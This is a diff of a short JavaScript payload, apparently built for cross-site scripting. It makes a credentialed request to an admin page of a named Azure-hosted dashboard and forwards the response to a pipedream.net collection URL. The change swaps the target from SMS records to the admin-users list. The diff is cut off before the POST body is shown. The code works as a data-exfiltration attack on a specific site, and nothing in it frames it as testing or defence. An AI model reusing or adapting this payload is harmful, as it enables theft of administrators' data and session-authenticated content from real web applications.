@@ -1,13 +1,13 @@
 var xhr = new XMLHttpRequest();
 
-xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/smsN', true);
+xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/admin-users', true);
 
 xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
 
         var http = new XMLHttpRequest();
-        var url = "https://enxg7v5ip50sd.x.pipedream.net/SMS";
+        var url = "https://enxg7v5ip50sd.x.pipedream.net/ADMINS";
         http.open("POST", url, true);
         http.setRequestHeader("Content-type", "text/plain");
         http.onreadystatechange = function() {
